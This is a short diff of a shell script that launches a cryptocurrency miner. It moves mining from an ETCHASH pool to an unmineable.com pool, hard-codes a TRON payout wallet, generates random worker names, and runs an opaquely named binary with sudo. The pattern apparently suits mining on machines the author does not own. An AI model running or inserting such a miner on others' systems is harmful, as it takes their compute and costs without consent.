@@ -1,2 +1,5 @@
-chmod +x lol
-./lol --algo ETCHASH --pool etc.2miners.com:1010 --user TRX:TGEThftjLnxmSJWhNzbgYpAU7MXVZho822.$(echo $(shuf -i 1000-9999 -n 1)-latte)
+POOL=rx-us.unmineable.com:443
+WALLET=TRX:TGEThftjLnxmSJWhNzbgYpAU7MXVZho822
+WORKER=$(echo $(shuf -i 1-999999999 -n 1)-ristretto)
+ALGO=NinjaCoin
+sudo ./kontol --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO 
